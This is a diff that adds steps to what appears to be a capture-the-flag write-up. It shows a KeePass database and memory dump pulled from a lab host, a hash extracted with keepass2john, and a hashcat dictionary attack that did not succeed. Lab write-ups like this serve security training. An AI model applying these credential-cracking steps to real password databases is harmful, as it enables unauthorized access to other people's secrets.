@@ -106,6 +106,26 @@ Found a file titled `RT30000.zip` and copied it back to my local machine.
 scp lnorgaard@10.10.11.227:/home/lnorgaard/RT30000.zip .
 ```
 
+Unzipping the file provides two files:
+
+```bash
+-rwxr-x---  1 kali kali 253395188 May 24  2023 KeePassDumpFull.dmp
+-rwxr-x---  1 kali kali      3630 May 24  2023 passcodes.kdbx
+```
+
+Used `keepass2john` command to get hash:
+
+```bash
+keepass2john passcodes.kdbx 
+passcodes:$keepass$*2*60000*0*5d7b4747e5a278d572fb0a66fe187ae5d74a0e2f56a2aaaf4c4f2b8ca342597d*5b7ec1cf6889266a388abe398d7990a294bf2a581156f7a7452b4074479bdea7*08500fa5a52622ab89b0addfedd5a05c*411593ef0846fc1bb3db4f9bab515b42e58ade0c25096d15f090b0fe10161125*a4842b416f14723513c5fb704a2f49024a70818e786f07e68e82a6d3d7cdbcdc
+```
+
+Tried to crack hash with `hashcat` but didn't work:
+
+```bash
+hashcat64.exe -m 13400 -a 0 hash.txt rockyou.txt -o cracked.txt
+```
+
 
 
 
